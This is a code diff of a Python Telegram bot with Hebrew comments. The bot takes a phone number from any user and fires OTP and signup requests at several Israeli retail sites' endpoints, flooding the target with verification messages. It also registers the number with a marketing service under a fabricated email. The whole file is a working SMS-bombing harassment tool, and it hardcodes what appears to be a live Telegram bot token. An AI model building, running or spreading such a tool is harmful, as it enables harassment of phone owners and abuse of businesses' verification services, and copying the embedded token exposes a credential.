@@ -5,35 +5,40 @@ from flask import Flask
 from threading import Thread
 import os
 
-# --- חלק 1: שרת Flask עבור Render ---
+# --- 1. שרת Flask עבור Render (פותר את בעיית ה-Port) ---
 app = Flask('')
+
 @app.route('/')
-def home(): return "Bot is Running"
+def home():
+    return "Bot is running!"
+
+def run():
+    port = int(os.environ.get("PORT", 8080))
+    app.run(host='0.0.0.0', port=port)
 
 def keep_alive():
-    t = Thread(target=lambda: app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 8080))))
+    t = Thread(target=run)
     t.start()
 
-# --- חלק 2: הגדרת הבוט ---
+# --- 2. הגדרת הבוט ---
 API_TOKEN = '8788411826:AAEQdmRx50VFB91zjRJrEaMJFghDp8Tayg0'
 bot = telebot.TeleBot(API_TOKEN)
 
 def attack(target):
-    # רשימת ה-APIs עם תיקון פסיקים וסוגרים
+    # רשימת האתרים מסודרת ומתוקנת
     apis = [
         {"n": "Fox", "u": "https://fox.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "80b41189-2a28-47cf-9c11-62cda2c7de71"}},
         {"n": "Laline", "u": "https://www.laline.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "c8b24899-349b-4838-8303-d279d4e2fffd"}},
-        {"n": "Foot Locker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "80b41189-2a28-47cf-9c11-62cda2c7de71"}},
+        {"n": "Footlocker", "u": "https://footlocker.co.il/apps/dream-card/api/proxy/otp/send", "d": {"phoneNumber": target, "uuid": "80b41189-2a28-47cf-9c11-62cda2c7de71"}},
         {"n": "Terminal X", "u": "https://www.terminalx.com/api/v1/auth/otp/send", "d": {"phone": target}},
         {"n": "Golf", "u": "https://www.golf-il.co.il/customer/ajax/post/", "d": {"form_key": "WaqdnLcdTj3jsiZw", "bot_validation": "1", "type": "login", "telephone": target}},
         {
-            "n": "Flashy",
-            "u": "https://api.flashy.app/thunder/contact?overwrite=true&primary_key=email",
+            "n": "Flashy", 
+            "u": "https://api.flashy.app/thunder/contact?overwrite=true&primary_key=email", 
             "d": {
-                "email": f"user_{target}@gmail.com",
-                "phone": target,
-                "signup_source": "welcome",
-                "lists": {"15304": True}
+                "email": f"user_{target}@gmail.com", 
+                "phone": target, 
+                "signup_source": "welcome"
             }
         }
     ]
@@ -42,11 +47,13 @@ def attack(target):
     
     for site in apis:
         try:
+            # שליחה מותאמת לגולף (Form Data) לעומת השאר (JSON)
             if site["n"] == "Golf":
                 requests.post(site["u"], data=site["d"], headers=headers, timeout=5)
             else:
                 requests.post(site["u"], json=site["d"], headers=headers, timeout=5)
-        except: pass
+        except:
+            pass
         time.sleep(1)
 
 @bot.message_handler(func=lambda m: True)
@@ -54,12 +61,13 @@ def handle(m):
     target = m.text.strip()
     if target.isdigit() and len(target) >= 9:
         bot.reply_to(m, f"🚀 מתחיל עבודה על {target}...")
-        attack(target) # מריץ סבב אחד
-        bot.send_message(m.chat.id, "✅ הסתיים.")
+        attack(target)
+        bot.send_message(m.chat.id, "✅ הסבב הסתיים.")
     else:
         bot.reply_to(m, "שלח מספר טלפון תקין.")
 
+# --- 3. הרצה ---
 if __name__ == "__main__":
-    keep_alive() # מפעיל את השרת ש-Render מחפש
+    keep_alive() # מפעיל את השרת ברקע
     print("--- BOT STARTED ---")
     bot.infinity_polling()
